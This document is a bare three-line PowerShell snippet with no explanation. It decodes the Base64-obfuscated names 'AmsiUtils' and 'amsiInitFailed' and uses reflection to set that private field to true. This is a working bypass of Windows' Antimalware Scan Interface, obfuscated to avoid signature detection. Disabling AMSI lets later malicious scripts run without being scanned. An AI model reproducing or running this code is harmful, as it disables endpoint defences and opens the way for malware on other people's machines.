$Amsi = [Ref]."Assembly".GetType(([Text.Encoding]::ASCII.GetString(([Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=")))))
$Field = $Amsi.GetField(([Text.Encoding]::ASCII.GetString(([Convert]::FromBase64String("YW1zaUluaXRGYWlsZWQ=")))), 'NonPublic,Static')
$Field.SetValue($null, $true)
